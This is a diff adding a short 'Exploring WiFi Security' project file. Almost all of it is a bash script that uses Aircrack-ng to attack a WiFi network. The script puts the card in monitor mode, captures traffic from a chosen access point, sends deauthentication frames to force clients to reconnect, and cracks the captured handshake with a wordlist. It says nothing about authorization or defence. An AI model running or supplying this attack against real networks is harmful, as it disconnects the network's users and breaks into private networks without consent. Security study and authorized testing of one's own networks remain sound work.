@@ -1,0 +1,19 @@
+Project 1: Exploring WiFi Security
+WiFi Hacking Techniques (using Aircrack-ng for Password Cracking)
+To crack WiFi passwords using Aircrack-ng, here is a script that demonstrates password cracking on a captured handshake file.
+
+
+#!/bin/bash
+# WiFi password cracking script using Aircrack-ng
+
+# Capture a handshake
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon --bssid [AP BSSID] -c [Channel] -w capture
+
+# Deauthenticate to capture handshake
+sudo aireplay-ng --deauth 10 -a [AP BSSID] wlan0mon
+
+# Crack the password with a wordlist
+sudo aircrack-ng -w /path/to/wordlist.txt -b [AP BSSID] capture*.cap
+
+Note: Replace [AP BSSID], [Channel], and /path/to/wordlist.txt with actual values.
